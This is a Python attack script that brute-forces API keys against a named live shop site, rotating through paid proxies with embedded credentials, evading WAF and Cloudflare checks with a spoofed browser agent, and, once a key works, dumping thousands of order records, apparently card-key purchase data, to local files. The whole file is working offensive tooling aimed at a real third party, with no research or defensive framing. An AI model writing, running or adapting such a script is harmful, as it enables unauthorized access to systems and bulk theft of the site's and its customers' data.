#!/usr/bin/env python3
"""fffzz.lol %61pi.php API key brute — fast: per-worker proxy, stream keys, single param."""
import json
import os
import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://fffzz.lol/shop/"
API = BASE + "%61pi.php"
OUT = Path(sys.argv[6]) if len(sys.argv) > 6 else Path("/workspace/results/fffzz.lol/kami_allin_20260717")
OUT.mkdir(parents=True, exist_ok=True)
JAR = str(OUT / f".cookies_api_w{int(sys.argv[5]) if len(sys.argv) > 5 else 0}")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HITS = OUT / "KAMI_HIT.jsonl"
FOUND_KEY = OUT / "API_KEY_FOUND.txt"
PROGRESS = OUT / "api_brute_progress.json"
LOCK = threading.Lock()
WID = int(sys.argv[5]) if len(sys.argv) > 5 else 0
LOG = open(OUT / f"api_brute_w{WID}.log", "a", buffering=1)
QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
PROXY = ""
PROXY_AT = 0
CURL_N = 0
CURL_TIMEOUT = os.environ.get("FFFZZ_TIMEOUT", "5" if os.environ.get("FFFZZ_TURBO") else "8")
TURBO = bool(os.environ.get("FFFZZ_TURBO"))


def log(msg):
    with LOCK:
        line = f"[{datetime.now().strftime('%H:%M:%S')}] w{WID} {msg}"
        print(line, flush=True)
        LOG.write(line + "\n")


def is_waf(body):
    if not body:
        return True
    b = body.lower()
    return any(x in b for x in ("_guard/html.js", "slider_html", "cf-chl", "just a moment", "access denied"))


def is_auth_prompt(body):
    return body and "请提供用户登录信息或API对接密钥" in body


def is_success(body):
    if not body or is_waf(body) or is_auth_prompt(body):
        return False
    if '"code":0' in body:
        return True
    return any(x in body for x in ("kminfo", "卡密", "订单结果", "----"))


def fetch_proxy():
    global PROXY, PROXY_AT
    pf = OUT / f"proxy_w{WID}.txt"
    if pf.exists() and time.time() - pf.stat().st_mtime < 140:
        PROXY = pf.read_text().strip()
        PROXY_AT = pf.stat().st_mtime
        if PROXY:
            return True
    urls = [
        f"https://share.proxy.qg.net/query?key={QG_KEY}&pwd={QG_PWD}",
        f"https://share.proxy.qg.net/get?key={QG_KEY}&pwd={QG_PWD}&num=1&distinct=true",
        f"https://share.proxy.qg.net/pool?key={QG_KEY}&pwd={QG_PWD}",
    ]
    for url in urls:
        try:
            raw = subprocess.run(
                ["curl", "-sS", "--max-time", "12", url],
                capture_output=True, text=True, timeout=15,
            ).stdout or ""
            data = json.loads(raw)
            if data.get("code") != "SUCCESS" or not data.get("data"):
                continue
            server = data["data"][0]["server"]
            PROXY = f"http://{QG_KEY}:{QG_PWD}@{server}"
            PROXY_AT = time.time()
            pf.write_text(PROXY)
            return True
        except Exception:
            continue
    return False


def ensure_proxy():
    global PROXY, PROXY_AT
    pf = OUT / f"proxy_w{WID}.txt"
    if pf.exists() and time.time() - pf.stat().st_mtime < 140:
        PROXY = pf.read_text().strip()
        PROXY_AT = pf.stat().st_mtime
        if PROXY:
            return
    shared = Path("/data/config/proxy.env")
    if shared.exists():
        for line in shared.read_text().splitlines():
            if line.startswith("PROXY_URL="):
                PROXY = line.split("=", 1)[1].strip().strip('"')
                PROXY_AT = shared.stat().st_mtime
                return
    if not PROXY or time.time() - PROXY_AT > 140:
        fetch_proxy()


def curl(url, retry=1 if TURBO else 2):
    global CURL_N
    CURL_N += 1
    if CURL_N % 80 == 1 or not PROXY:
        ensure_proxy()
    proxies = [PROXY] if PROXY else []
    if not TURBO:
        proxies.append(None)
    for px in proxies:
        for attempt in range(retry):
            cmd = ["curl", "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
                   "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
            if px:
                cmd = ["curl", "-x", px, "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
                       "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=int(CURL_TIMEOUT) + 2).stdout or ""
                if is_auth_prompt(r) or (r.strip() and not is_waf(r)):
                    return r
                if is_waf(r) and px:
                    fetch_proxy()
                    time.sleep(1 + attempt)
            except Exception:
                time.sleep(0.3)
    return ""


def wait_for_site():
    while True:
        body = curl(f"{API}/?act=search&id=1", retry=2)
        if body:
            log(f"site up {body[:80]}")
            return
        log("site down, retry 15s")
        time.sleep(15)


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {}


def save_progress(offset, tested, rate=0):
    data = load_progress()
    data[str(WID)] = {
        "offset": offset, "tested": tested,
        "rate": round(rate, 1),
        "ts": datetime.now().isoformat(),
    }
    PROGRESS.write_text(json.dumps(data, indent=2))


def try_key(key):
    body = curl(f"{API}/?act=search&id=1&key={quote(key, safe='')}")
    if is_success(body):
        return "key", key, body
    if body and not is_auth_prompt(body) and not is_waf(body):
        for param in ("api_key", "token", "apikey"):
            body2 = curl(f"{API}/?act=search&id=1&{param}={quote(key, safe='')}")
            if is_success(body2):
                return param, key, body2
    return None


def dump_orders(api_key, param="key", max_id=18600, workers=15):
    log(f"DUMP {param}={api_key[:20]}")
    results = []

    def fetch(oid):
        body = curl(f"{API}/?act=search&id={oid}&{param}={quote(api_key, safe='')}")
        return (oid, body) if is_success(body) else None

    with ThreadPoolExecutor(workers) as ex:
        futs = {ex.submit(fetch, i): i for i in range(1, max_id + 1)}
        for i, f in enumerate(as_completed(futs), 1):
            r = f.result()
            if r:
                oid, body = r
                results.append({"id": oid, "body": body})
                with LOCK:
                    with HITS.open("a") as hf:
                        hf.write(json.dumps({"kind": "api_dump", "id": oid, "resp": body[:2000]}, ensure_ascii=False) + "\n")
            if i % 2000 == 0:
                log(f"dump {i}/{max_id} hits={len(results)}")
    (OUT / f"api_orders_dump_w{WID}.json").write_text(json.dumps(results, ensure_ascii=False, indent=2))
    log(f"DUMP done {len(results)}")


def iter_key_batches(wl, start, limit, batch_size=4000 if TURBO else 800):
    batch, pos = [], start
    with wl.open(encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            if i < start:
                continue
            if limit and i >= start + limit:
                break
            k = line.strip()
            if not (1 <= len(k) <= 128):
                continue
            batch.append(k)
            pos = i + 1
            if len(batch) >= batch_size:
                yield pos, batch
                batch = []
    if batch:
        yield pos, batch


def main():
    wl = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/data/wordlists/faka/faka-tokens.txt")
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    limit = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    workers = int(sys.argv[4]) if len(sys.argv) > 4 else 10

    prog = load_progress()
    tested = 0
    if str(WID) in prog:
        p = prog[str(WID)]
        saved = p.get("offset", 0)
        end = start + limit if limit else saved + 1
        if saved >= start and (not limit or saved < start + limit):
            start = saved
            tested = p.get("tested", 0)
            log(f"resume offset={start} tested={tested}")

    fetch_proxy()
    log(f"proxy {PROXY.split('@')[-1] if PROXY else 'none'}")
    wait_for_site()

    t0 = time.time()
    log(f"FAST brute start={start} limit={limit or 'all'} threads={workers}")

    if WID == 0 and start == 0:
        for k in ("", "fffzz", "admin", "123456", "api", "fffzzlol"):
            r = try_key(k)
            if r:
                param, key, body = r
                FOUND_KEY.write_text(f"{param}={key}\n{body[:500]}")
                log(f"*** FOUND {param}={key}")
                dump_orders(key, param)
                return

    pos = start
    for end_pos, batch in iter_key_batches(wl, start, limit):
        with ThreadPoolExecutor(min(workers, len(batch))) as ex:
            futs = {ex.submit(try_key, k): k for k in batch}
            for f in as_completed(futs):
                tested += 1
                r = f.result()
                if r:
                    param, key, body = r
                    FOUND_KEY.write_text(f"w{WID} {param}={key}\n{body[:500]}")
                    with HITS.open("a") as hf:
                        hf.write(json.dumps({"kind": "api_key_found", "worker": WID, "param": param, "key": key, "resp": body[:500]}, ensure_ascii=False) + "\n")
                    log(f"*** API KEY FOUND {param}={key} {body[:200]}")
                    save_progress(end_pos, tested)
                    dump_orders(key, param)
                    return
        pos = end_pos
        elapsed = time.time() - t0
        rate = tested / elapsed if elapsed > 0 else 0
        save_progress(pos, tested, rate)
        log(f"progress offset={pos} tested={tested} rate={rate:.1f}/s")

    save_progress(pos, tested)
    log("chunk done no hit")


if __name__ == "__main__":
    main()
